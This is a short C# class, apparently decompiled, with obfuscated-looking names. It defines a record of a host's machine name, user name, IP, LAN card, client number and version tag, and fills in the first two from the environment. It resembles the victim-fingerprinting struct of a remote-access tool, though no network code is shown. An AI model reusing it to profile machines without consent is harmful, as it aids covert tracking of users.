using System;

namespace narthimesa;

public class MRAEINF
{
	public string narthimesalancard = "";

	public string narthimesauname = "";

	public string narthimesacname = "";

	public string narthimesaapver;

	public string narthimesauip = "";

	public string narthimesaclientNum = "";

	public MRAEINF()
	{
		narthimesaapver = "T.E.0.3|narthimesa".Split(new char[1] { '|' })[0];
		narthimesacname = Environment.MachineName;
		narthimesauname = Environment.UserName;
		narthimesauip = "";
		narthimesalancard = "";
	}
}
